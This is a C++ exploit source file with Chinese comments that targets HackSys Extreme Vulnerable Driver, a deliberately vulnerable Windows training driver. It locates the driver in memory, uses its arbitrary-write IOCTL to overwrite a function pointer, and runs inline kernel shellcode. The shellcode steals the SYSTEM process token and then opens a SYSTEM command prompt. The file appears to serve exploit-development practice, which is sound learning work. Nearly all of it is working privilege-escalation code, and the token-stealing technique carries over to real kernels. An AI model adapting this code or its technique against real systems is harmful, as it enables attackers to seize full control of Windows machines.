// HEVD_ARBITRARY_WRITE.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include<Psapi.h>
#include<profileapi.h>

struct WW_OBJECT
{
	DWORD * What;
	DWORD  Where;
};

struct FAKE_OBJECT
{
	DWORD pointer;
	char buf[0x54];
};

LPVOID HevdBase()
{
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	TCHAR lpfileName[1024];
	//Retrieves the load address for each device driver in the system
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		//Retrieves the base name of the specified device driver
		GetDeviceDriverBaseNameA(lpImageBase[i], lpfileName, 48);

		if (!strcmp(lpfileName, "HEVD.sys"))
		{
			printf("[+]success to get %s\n", lpfileName);
			return lpImageBase[i];
		}
	}
	return NULL;
}

// 抄的shellcode
void shellcode()
{
	_asm
	{
		nop
		pushad
		mov eax, fs:[124h]		// 找到当前线程的_KTHREAD结构
		mov eax, [eax + 0x50]   // 找到_EPROCESS结构
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

	// 循环是为了获取system的_EPROCESS
	find_sys_pid :
		mov eax, [eax + 0xb8]	// 找到进程活动链表
		sub eax, 0xb8    		// 链表遍历
		cmp[eax + 0xb4], edx    // 根据PID判断是否为SYSTEM
		jnz find_sys_pid

		// 替换Token
		mov edx, [eax + 0xf8]
		mov[ecx + 0xf8], edx
		popad
		ret
	}
}

int main()
{
	HANDLE hDevice = NULL;
	DWORD recv = NULL;

	hDevice = CreateFile("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (FAILED(hDevice))
	{
		printf("Failed to open device\n");
		return 0;
	}

	//将 shellcode 的指针写到 0x58 大小的缓冲区中
	FAKE_OBJECT * buffer = (FAKE_OBJECT *)malloc(0x58);
	buffer->pointer = (DWORD)shellcode;
	memset(buffer->buf, 0x41, 0x54);
	
	//构造Where What 内存结构
	WW_OBJECT * obj = new WW_OBJECT();
	DWORD  whatAddr = (DWORD)buffer;
	obj->Where = (DWORD)HevdBase() + 0x43014;
	obj->What = &whatAddr;

	//我知道有人采用覆盖 HalDispatchTable 的方式，但我想更直接一些，所以就地取材。
	//在 UseUaFObject 里有一个函数指针引用，我直接修改其函数指针，再调用 UseUaFObject 达到执行shellcode效果。

	//ArbitraryWrite 
	DeviceIoControl(hDevice, 0x22200B, obj, sizeof(WW_OBJECT), NULL, NULL, &recv, NULL);

	//UseUaFObject
	DeviceIoControl(hDevice, 0x222017, NULL, NULL, NULL, NULL, &recv, NULL);

	system("start cmd.exe");
	std::cout << "Done!\n";
	CloseHandle(hDevice);
}